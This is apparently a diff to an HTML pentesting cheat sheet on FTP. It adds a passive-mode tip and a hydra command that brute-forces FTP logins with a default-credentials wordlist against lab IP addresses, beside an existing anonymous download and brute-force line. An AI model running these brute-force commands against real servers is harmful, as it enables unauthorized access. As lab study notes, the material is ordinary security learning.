@@ -31,17 +31,24 @@
                <h3>Download all available files</h3>
                <pre><code class="language-bash">wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136</code></pre>
             </ul>
+
+            <h2>Passive Mode</h2>
+                <ul>
+                    <p>In case you enter an FTP server and you see the following message: <b>Using binary mode to transfer files.</b> just type the following command to exit passive mode</p>
+                    <pre><code class="language-bash">passive</code></pre>
+                </ul>
         </div>
 
 
         <div class="notion-body">
             <h2>Exploitation</h2>
             <ul>
-
                 <h3>Bruteforcing</h3>
                 <ul>
                 <p>Simple way to bretuce force for specific user an FTP service</p>
                 <pre><code class="language-bash">hydra -L users.list -P passwords.list ftp://10.129.5.150 -s 21</code></pre> 
+                <p>In case you have a list of users and passwords like this <b>user:password</b></p>
+                <pre><code class="language-bash">hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.243.56 -s 21</code></pre>     
                 </ul>    
             
                 <h3>FTP bounce attack</h3>
